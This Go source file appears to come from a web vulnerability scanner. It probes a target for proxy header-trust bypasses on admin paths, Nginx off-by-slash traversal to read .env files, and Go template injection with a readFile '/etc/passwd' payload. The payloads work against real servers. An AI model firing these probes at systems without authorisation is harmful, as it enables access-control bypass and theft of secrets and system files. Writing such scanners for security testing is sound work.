package proxy

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"sort"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

var (
	internalHeaders = map[string]string{
		"X-Forwarded-For":    "127.0.0.1",
		"X-Real-IP":          "127.0.0.1",
		"True-Client-IP":     "127.0.0.1",
		"Client-IP":          "127.0.0.1",
		"Forwarded":          "for=127.0.0.1;by=127.0.0.1",
		"X-Originating-IP":   "127.0.0.1",
		"X-Remote-IP":        "127.0.0.1",
		"X-Remote-Addr":      "127.0.0.1",
		"X-Client-IP":        "127.0.0.1",
		"X-Host":             "127.0.0.1",
		"X-Forwarded-Host":   "127.0.0.1",
		"X-Forwarded-Server": "127.0.0.1",
	}

	internalPaths = []string{"/admin", "/internal", "/stats", "/server-status", "/config", "/api/v1/admin"}
)

type bypassEvidence struct {
	Header      string
	Endpoint    string
	BodySummary string
	Sensitive   bool
	BaseHash    string
	AttackHash  string
}

// Scan tests for reverse-proxy trust misconfiguration and reports one root-cause cluster.
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if strings.TrimSpace(baseURL) == "" {
		return
	}
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	vectors := make([]bypassEvidence, 0, 32)
	confirmedHeaders := make(map[string]bool)
	impactedEndpoints := make(map[string]bool)
	hasSensitiveExposure := false

	// 1. Header spoofing for internal access (root-cause cluster).
	for _, path := range internalPaths {
		target := baseURL + strings.TrimPrefix(path, "/")

			respBase, err := client.Get(target)
			if err != nil {
				continue
			}
			baseStatus := respBase.StatusCode
			baseBody, _ := io.ReadAll(respBase.Body)
			respBase.Body.Close()
			baseHash := hashBody(baseBody)

		// Test bypass only when endpoint is access-controlled by default.
		if baseStatus != http.StatusForbidden && baseStatus != http.StatusUnauthorized {
			continue
		}

		for hName, hVal := range internalHeaders {
			req, _ := http.NewRequest(http.MethodGet, target, nil)
			req.Header.Set(hName, hVal)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				continue
			}

				bodyStr := string(body)
				bodyLower := strings.ToLower(bodyStr)
				isSensitive := strings.Contains(bodyLower, "admin") ||
					strings.Contains(bodyLower, "config") ||
					strings.Contains(bodyLower, "dashboard") ||
					strings.Contains(bodyLower, "root")
				attackHash := hashBody(body)

				// Stable body-fingerprint guard: same fingerprint as baseline indicates generic gate page.
				if attackHash == baseHash {
					continue
				}

			// Skip obvious default/placeholder pages to reduce FPs.
			isDefaultPage := len(bodyStr) < 500 &&
				(strings.Contains(bodyLower, "welcome to") ||
					strings.Contains(bodyLower, "it works") ||
					strings.Contains(bodyLower, "default page"))
			if isDefaultPage {
				continue
			}

			confirmedHeaders[hName] = true
			impactedEndpoints[target] = true
			if isSensitive {
				hasSensitiveExposure = true
			}

				vectors = append(vectors, bypassEvidence{
					Header:      hName,
					Endpoint:    target,
					BodySummary: summarizeBody(bodyStr),
					Sensitive:   isSensitive,
					BaseHash:    shortHash(baseHash),
					AttackHash:  shortHash(attackHash),
				})
			}
		}

	if len(vectors) > 0 {
		detail := buildProxyRootCauseDetail(vectors, confirmedHeaders, impactedEndpoints, len(internalHeaders))
		severity := "High"
		confidence := "probable"
		if hasSensitiveExposure {
			severity = "Critical"
			confidence = "confirmed"
		}

		fmt.Printf("[!] POSITIVE MATCH: Proxy header-trust root cause at %s (vectors=%d)\n", baseURL, len(vectors))
		onFound(core.Finding{
			Type:       "Improper Trust in HTTP Headers (Proxy Bypass)",
			Target:     baseURL,
			Detail:     detail,
			Severity:   severity,
			Confidence: confidence,
		})
	}

	// 2. Nginx off-by-slash traversal.
	nginxPaths := []string{"static", "assets", "js", "css"}
	for _, p := range nginxPaths {
		target := baseURL + p + "../.env"
		resp, err := client.Get(target)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		isHTML := strings.Contains(strings.ToLower(bodyStr), "<html") ||
			strings.Contains(strings.ToLower(bodyStr), "<!doctype") ||
			strings.Contains(strings.ToLower(bodyStr), "<div") ||
			strings.Contains(strings.ToLower(bodyStr), "<span") ||
			strings.Contains(strings.ToLower(bodyStr), "<h4>")
		isEnv := strings.Contains(bodyStr, "DB_") ||
			strings.Contains(bodyStr, "APP_") ||
			strings.Contains(bodyStr, "SECRET") ||
			strings.Contains(bodyStr, "PASSWORD")

		if resp.StatusCode == http.StatusOK && strings.Contains(bodyStr, "=") && !isHTML && isEnv {
			fmt.Printf("[!] POSITIVE MATCH: Nginx Alias Traversal at %s\n", target)
			onFound(core.Finding{
				Type:       "Nginx Configuration Error",
				Target:     target,
				Detail:     "Off-by-slash alias traversal leaked .env file",
				Severity:   "Critical",
				Confidence: "confirmed",
			})
		}
	}

	// 3. Caddy/Go template injection in headers.
	templatePayload := `{{readFile "/etc/passwd"}}`
	req, _ := http.NewRequest(http.MethodGet, baseURL, nil)
	req.Header.Set("Referer", templatePayload)
	req.Header.Set("User-Agent", templatePayload)

	resp, err := client.Do(req)
	if err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if strings.Contains(string(body), "root:x:") {
			fmt.Printf("[!] POSITIVE MATCH: Template Injection at %s\n", baseURL)
			onFound(core.Finding{
				Type:       "Server-Side Template Injection",
				Target:     baseURL,
				Detail:     "Caddy/Go Template Injection via headers confirmed",
				Severity:   "Critical",
				Confidence: "confirmed",
			})
		}
	}
}

func buildProxyRootCauseDetail(vectors []bypassEvidence, confirmedHeaders map[string]bool, impactedEndpoints map[string]bool, testedHeaders int) string {
	headers := make([]string, 0, len(confirmedHeaders))
	for h := range confirmedHeaders {
		headers = append(headers, h)
	}
	sort.Strings(headers)

	endpoints := make([]string, 0, len(impactedEndpoints))
	for ep := range impactedEndpoints {
		endpoints = append(endpoints, ep)
	}
	sort.Strings(endpoints)

	var b strings.Builder
	b.WriteString("Root Cause: Reverse Proxy Header Trust Misconfiguration\n")
	b.WriteString("Impact:\n")
	b.WriteString(" - Internal endpoint access-control bypass\n")
	b.WriteString(" - Potential privilege boundary bypass via spoofed client identity\n")
	b.WriteString("Validation: deterministic=true control_validation=true body_fingerprint=true\n")
	b.WriteString(fmt.Sprintf("Vectors tested: %d headers\n", testedHeaders))
	b.WriteString(fmt.Sprintf("Confirmed bypass: yes (headers=%d, endpoints=%d)\n", len(headers), len(endpoints)))
	b.WriteString(fmt.Sprintf("Confirmed headers: %s\n", strings.Join(headers, ", ")))
	b.WriteString("Representative evidence:\n")

	maxRep := len(vectors)
	if maxRep > 8 {
		maxRep = 8
	}
	for i := 0; i < maxRep; i++ {
		ev := vectors[i]
		sensitivity := "generic-content"
		if ev.Sensitive {
			sensitivity = "sensitive-content"
		}
		b.WriteString(fmt.Sprintf("%d. header=%s endpoint=%s signal=%s fingerprint=%s->%s body=\"%s\"\n", i+1, ev.Header, ev.Endpoint, sensitivity, ev.BaseHash, ev.AttackHash, ev.BodySummary))
	}
	if len(vectors) > maxRep {
		b.WriteString(fmt.Sprintf("... %d additional vectors omitted.\n", len(vectors)-maxRep))
	}

	b.WriteString("Impacted endpoints:\n")
	for _, ep := range endpoints {
		b.WriteString("- " + ep + "\n")
	}
	return strings.TrimSpace(b.String())
}

func summarizeBody(body string) string {
	normalized := strings.Join(strings.Fields(strings.TrimSpace(body)), " ")
	if normalized == "" {
		return "<empty>"
	}
	if len(normalized) > 90 {
		return normalized[:90] + "..."
	}
	return normalized
}

func hashBody(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

func shortHash(h string) string {
	if len(h) <= 10 {
		return h
	}
	return h[:10]
}
